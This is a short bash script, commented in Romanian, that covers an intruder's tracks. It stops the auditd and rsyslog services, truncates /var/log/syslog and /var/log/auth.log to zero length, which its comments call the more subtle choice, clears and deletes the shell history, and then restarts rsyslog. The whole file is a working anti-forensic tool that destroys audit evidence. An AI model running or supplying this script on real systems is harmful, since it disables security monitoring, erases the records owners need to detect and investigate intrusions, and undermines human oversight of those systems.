#!/bin/bash

echo "[*] Attempting to stop audit logging..."
# Încearcă să oprească serviciile de securitate
sudo systemctl stop auditd
sudo systemctl stop rsyslog

echo "[*] Clearing logs..."
# Golește fișierele de log fără a le șterge (mai subtil)
sudo truncate -s 0 /var/log/syslog
sudo truncate -s 0 /var/log/auth.log

echo "[*] Clearing history..."
history -c
rm ~/.bash_history

echo "[*] Restoring services (so you can see this log)..."
sudo systemctl start rsyslog
